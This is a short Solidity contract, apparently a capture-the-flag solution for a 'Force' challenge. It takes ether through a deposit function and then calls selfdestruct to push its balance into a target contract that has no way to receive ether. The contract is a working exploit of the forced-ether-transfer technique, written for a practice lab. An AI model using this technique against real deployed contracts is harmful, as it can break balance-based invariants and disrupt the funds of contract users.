//SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Force} from "../src/Force.sol";

contract AttackForce {

    Force force;

    mapping(address => uint256) private s_userBalance;

    uint256 public balance;

    constructor(address _force){
        force = Force(_force);
    } 

    function deposit() external payable{
        require(msg.value > 0, "should be greater than 0");
        s_userBalance[msg.sender]+=msg.value;
        balance+=msg.value;
    }
    function getBalance() public view returns(uint256){
        return balance;
    }

    function attack() public payable {
        address payable addr = payable(address(force));
        selfdestruct(addr);

    }
}